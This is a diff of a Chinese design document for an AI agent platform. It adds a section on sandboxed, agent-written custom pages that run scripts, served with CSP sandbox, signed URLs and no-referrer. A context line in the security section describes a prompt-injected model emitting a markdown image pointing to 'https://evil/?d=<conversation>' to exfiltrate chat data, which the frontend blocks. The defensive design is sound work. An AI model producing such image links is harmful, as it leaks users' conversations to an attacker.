@@ -53,7 +53,7 @@ muliao/
   platform/        数据库、任务队列（actor 调度；别的领域经它的只读查询 TaskView 看自己 lane 上的任务）、事件与定向命令、实时展示总线、运行中检查的节拍、shell、id、工具调用的展示块（tool_views，第 17 节）
   agent_runtime/   会话运行的端口：模型注册表、指令组装、工具组合（toolbox.py）、pydantic-ai 的逐步驱动、它自己写下的消息约定（工具交回的文件与图片）、MCP 连接
   sessions/        会话（子域：会话、运行、交互、外部工作、委派、到点唤醒、展示，见下表）：信箱、历史、运行、挂起的调用、占用、结清、委派与 thread、到点唤醒、压缩、停止、删除、种类、会话的消息约定
-  workspace/       工作区：文件工具（read/write/edit_file、share_file）与 edit_file 的编辑规则、run_shell（前台与后台）、后台任务（jobs 表）、界面对工作目录的只读浏览（browse.py）
+  workspace/       工作区：文件工具（read/write/edit_file、share_file）与 edit_file 的编辑规则、run_shell（前台与后台）、后台任务（jobs 表）、界面对工作目录的只读浏览（browse.py）与 agent 自定义页面（sites.py，第 15 节）
   agents/          agent 目录、条目（skill、MCP、secret；secret 的加解密与 ${vault:KEY} 引用解析在 agents/secrets.py）与记忆及其版本、自我改进工具、工具权限与角色
   usage/           模型用量：每次运行记一条，按时间范围汇总
   issues/          issue 看板：人与 agent 协作的事项，动态按状态与指派投进 agent 的 issue 会话
@@ -568,6 +568,7 @@ agent 在任何一次运行里都可以主动 `write_skill`。新建的 skill �
 
 - Web 与 API：单用户密码登录（至少 8 位），HMAC 签名 cookie（密钥至少 32 位），有效期 90 天。签名 key 由密钥与密码摘要一起派生：改密码（改配置后重启）即吊销所有已签发的 cookie，没有服务端会话表；登出只删浏览器里的 cookie。登录接口未做频率限制，部署在公网时应在反向代理层限流。
 - 文件下载：与界面同源、带着登录 cookie，内容按不可信处理（agent 能写任意 HTML/SVG）。响应一律带 `X-Content-Type-Options: nosniff` 与 `Content-Security-Policy: sandbox`，只有 png/jpeg/gif/webp 按 inline 返回，其余一律 `Content-Disposition: attachment`，不在本站执行（同 Matrix 媒体下载）。agent 页「文件」读工作目录的文件（`GET /api/agents/{id}/workspace/file`，#308）同样处理；路径解析符号链接后必须在工作目录内，只防界面误走出去；界面预览用 fetch 读文字（Markdown 与代码高亮在前端做），HTML/SVG 只显示源码。
+- agent 自定义页面（#355，`workspace/sites.py`、`api/sites.py`）：agent 在工作目录写 `site/<页面名>/index.html`（标题取 `<title>`），界面「页面」列出（`GET /api/pages`）、iframe 打开。页面要能执行脚本，又不能与界面同源：响应带 `Content-Security-Policy: sandbox allow-scripts …`（不含 allow-same-origin），页面是不透明的源，读不到 cookie、调不了 `/api`。沙箱里的请求不带 cookie，页面与同目录文件凭签名 URL 访问（`/sites/<agent>/<页面>/<签名>/<文件>`，签名与 cookie 同一把 key，改密码即失效；只有登录后的列表接口给出）；页面用相对路径读同目录数据（跨源，响应带 `Access-Control-Allow-Origin: *`），`Referrer-Policy: no-referrer` 免得加载外部资源时带出签名 URL。平台不运行 agent 的服务：实时数据由触发器或常驻脚本写文件、页面轮询。
 - 回答里的图片：前端只渲染指向 `/api/files/` 的图片，外链图片显示为普通链接。否则被注入的模型输出 `![](https://evil/?d=<对话内容>)`，打开会话时浏览器就会自动把数据发出去。
 - Vault：Fernet 加密，主密钥来自配置 `vault.key`，缺失或格式错误时拒绝启动。
 - 配置文件：唯一配置来源（`config.example.toml`），未知键直接报错，避免拼写错误被静默忽略。
